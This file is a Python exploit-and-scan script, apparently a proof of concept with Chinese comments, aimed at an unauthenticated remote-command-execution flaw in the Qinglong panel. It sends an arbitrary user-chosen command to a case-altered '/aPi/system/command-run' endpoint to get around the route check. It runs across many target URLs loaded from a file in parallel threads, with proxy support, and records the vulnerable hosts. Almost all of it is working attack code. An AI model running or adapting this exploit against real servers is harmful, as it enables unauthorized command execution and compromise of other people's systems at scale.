#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import urllib3
import sys
import argparse
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BANNER = r"""
   ██╗    ██╗███████╗██╗ ██████╗██╗  ██╗ █████╗  ██████╗ 
   ██║    ██║██╔════╝██║██╔════╝██║  ██║██╔══██╗██╔═══██╗
   ██║ █╗ ██║█████╗  ██║██║     ███████║███████║██║   ██║
   ██║███╗██║██╔══╝  ██║██║     ██╔══██║██╔══██║██║   ██║
   ╚███╔███╔╝███████╗██║╚██████╗██║  ██║██║  ██║╚██████╔╝
    ╚══╝╚══╝ ╚══════╝╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ 
                                                   
[*] 青龙面板未授权RCE漏洞检测工具
[*] 作者: weichao
[*] 版本: 1.1
"""

HEALTH_PATH = "/api/health"
VULN_PATH = "/aPi/system/command-run"   # 注意大小写绕过

def check_target(url, cmd="id", timeout=5, retries=2, proxy=None, debug=False, no_health=False):
    """
    检测单个目标是否存在漏洞
    返回: (url, is_vuln, status_message)
    """
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    url = url.rstrip("/")

    proxies = {"http": proxy, "https": proxy} if proxy else None

    # 1. 基础连通性测试
    try:
        req = requests.get(url, timeout=timeout, verify=False, proxies=proxies)
        if debug:
            tqdm.write(f"[DEBUG] {url} -> 基础连通性成功 (HTTP {req.status_code})")
    except Exception as e:
        tqdm.write(f"[FAIL] {url} -> 基础连通性失败: {e}")
        return url, False, "connection_failed"

    # 2. 健康检查（可选）
    if not no_health:
        try:
            health_res = requests.get(url + HEALTH_PATH, timeout=timeout, verify=False, proxies=proxies)
            if health_res.status_code == 200:
                tqdm.write(f"[INFO] {url} -> 健康检查通过（青龙面板特征）")
            else:
                tqdm.write(f"[INFO] {url} -> 健康检查返回 {health_res.status_code}，可能非青龙面板")
        except Exception as e:
            if debug:
                tqdm.write(f"[DEBUG] {url} -> 健康检查异常: {e}")

    # 3. 漏洞验证（带重试）
    payload = {"command": cmd}
    for attempt in range(retries + 1):
        try:
            response = requests.put(
                url + VULN_PATH,
                json=payload,
                timeout=timeout,
                verify=False,
                proxies=proxies
            )
            if debug:
                tqdm.write(f"[DEBUG] {url} -> 漏洞探测状态码 {response.status_code}, 响应长度 {len(response.text)}")
            # 判断漏洞：响应中包含命令执行结果（uid=, gid= 等）
            if "uid=" in response.text and "gid=" in response.text:
                return url, True, "vulnerable"
            else:
                # 如果返回200但无特征，可能执行了但输出被过滤，可考虑其他判断
                return url, False, "safe"
        except Exception as e:
            if attempt < retries:
                if debug:
                    tqdm.write(f"[DEBUG] {url} -> 第{attempt+1}次请求失败，重试中...")
                time.sleep(0.5)
            else:
                tqdm.write(f"[ERROR] {url} -> 漏洞验证请求失败: {e}")
                return url, False, "request_error"

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="青龙面板未授权RCE漏洞检测POC")
    parser.add_argument('-u', '--url', type=str, help='单个目标URL（例如 http://192.168.1.100:5700）')
    parser.add_argument('-f', '--file', type=str, help='批量目标文件，每行一个URL')
    parser.add_argument('-t', '--threads', type=int, default=20, help='并发线程数 (默认20)')
    parser.add_argument('-o', '--output', type=str, default='success.txt', help='输出文件 (默认success.txt)')
    parser.add_argument('--timeout', type=int, default=5, help='请求超时秒数 (默认5)')
    parser.add_argument('--cmd', type=str, default='id', help='要执行的命令 (默认id)')
    parser.add_argument('--proxy', type=str, help='代理地址，例如 http://127.0.0.1:7890')
    parser.add_argument('--debug', action='store_true', help='开启调试输出')
    parser.add_argument('--no-health', action='store_true', help='跳过健康检查')
    args = parser.parse_args()

    # 处理目标列表
    targets = []
    if args.url:
        targets = [args.url]
    elif args.file:
        try:
            with open(args.file, 'r', encoding='utf-8') as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] 错误: 文件 '{args.file}' 未找到")
            sys.exit(1)
    else:
        parser.print_help()
        sys.exit(1)

    print(f"[*] 共加载 {len(targets)} 个目标，开始扫描...")
    results = []

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_url = {
            executor.submit(
                check_target,
                url,
                cmd=args.cmd,
                timeout=args.timeout,
                retries=2,
                proxy=args.proxy,
                debug=args.debug,
                no_health=args.no_health
            ): url for url in targets
        }

        with tqdm(total=len(targets), desc="扫描进度", unit="目标") as pbar:
            for future in as_completed(future_to_url):
                url, is_vuln, status = future.result()
                if is_vuln:
                    results.append(url)
                    tqdm.write(f"[!] 发现漏洞目标：{url}")
                pbar.update(1)

    # 保存结果
    if results:
        with open(args.output, 'w', encoding='utf-8') as f:
            f.write("\n".join(results))
        print(f"\n[+] 扫描完成，发现 {len(results)} 个漏洞目标，已保存至 {args.output}")
    else:
        print("\n[-] 未发现漏洞目标")

if __name__ == "__main__":
    main()